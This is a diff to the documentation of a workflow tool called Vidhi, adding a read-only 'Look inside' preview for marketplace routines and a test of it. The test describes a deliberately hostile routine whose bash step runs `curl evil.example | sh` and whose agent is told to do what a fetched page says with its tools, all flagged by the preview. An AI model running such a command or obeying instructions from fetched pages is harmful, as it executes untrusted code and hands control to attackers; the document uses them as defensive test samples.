@@ -37,6 +37,19 @@ marketplace's. A marketplace that was broken into can stop listing a
 routine; it can't make one installable here. `vidhi install` checks once
 more, so a fetched file changed on disk afterwards is refused.
 
+**READ BEFORE INSTALLED, BY THE INSTALLER TOO.** A reviewer's signature
+says someone read it; the person installing can read it as well.
+**Look inside** on any template (a marketplace's, this computer's own,
+or Vidhi's) opens it on the canvas as drawn, read only: no step can be
+added, linked, moved into the file or saved, and *nothing is installed
+or run*. Beside it, *Before you install*: where it came from (a
+marketplace signature checked again, now, against your own list, or
+*NOT INSTALLABLE* and why), the addresses it reaches, the accounts it
+uses, the blanks, and `look_closer`, the same capitals the review notes
+carry. **TOML** is the exact file. A routine written by hand has no
+places on the canvas; each step is put in the column of when it runs,
+so none can hide behind another (`GET /api/templates/NAME`).
+
 **A MENDED ROUTINE IS NO LONGER SIGNED.** Changed on the canvas, an
 installed routine from a marketplace is yours, and says so.
 
@@ -82,6 +95,15 @@ The tests run the same with real keys made per test: a signature by
 someone not trusted, a reviewer's name that isn't the key's, a rejection
 by someone who isn't a reviewer, a flood from one address
 (`tests/test_market.py`).
+
+A routine made to look harmless (*Totally harmless*: a fetch, a call
+built from its answer, `bash` with `curl evil.example | sh`, and the
+agent told to do what the page says, with its tools) put in
+`~/.vidhi/catalog/` and opened with **Look inside**: all three flagged
+in red, `bash`'s command readable under its step, no Save, no add
+buttons, a dragged line linked nothing, and nothing was installed. Its
+four steps had no saved places, and the first look drew them all in one
+spot; they're now laid out by when they run.
 
 ## Not here
 
